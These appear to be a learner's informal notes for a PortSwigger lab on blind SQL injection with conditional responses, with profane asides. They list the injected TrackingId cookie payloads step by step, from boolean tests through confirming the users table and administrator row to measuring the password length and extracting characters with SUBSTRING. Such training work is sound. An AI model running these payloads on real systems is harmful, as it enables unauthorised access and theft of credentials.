--Name: Blind SQL injection with conditional responses
--URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
--Level: Medium Time: 15 min
---------------------------------------------------------------------------------

-- Objective: log in as the administrator user.

-- Cookie name: TrackingId
-- Cookie value: UDI6pcKX6GYtrI52


SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND '1'='1    '???--    OK  Message ON
SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND '1'='2    '???--    OK  essage OFF

SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT 'a' FROM users LIMIT 1) = 'a  '???--    OK  Message ON 
-- meaning --
-- Users table is available
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT 'a' FROM users WHERE username='administrator' LIMIT 1) = 'a  '???--    OK  Message ON 
-- meaning --
-- "administrator" exists in the Users table as a username
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'a  '???--    OK  Message ON 
-- meaning --
-- the password lenght is bigger than 1 (obvusily it's gonna be bigger than 1 charachter, Stupid).
-- keep addding to the nubmber until the indecation stop working.
-- that number will be your password leangth.
-- the password is 19 letter :(
--------------------------

ELECT ???? FROM ???? WHERE TrackingId = 'LwmU2CrkGTmKeDm2' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a    '???-- 
-- using substring to baiscly get one letter/charachter to examin it substring(Srting, Start, length).
-- And then you try to get the password leter by leter and check if it's the letter you did enter.
-- so basicly you need to try every Fucking possibility for every Fucking letter there is.
-- You know what that means right?!.. That means go create a Fucking script to do it, Dummy.
--------------------------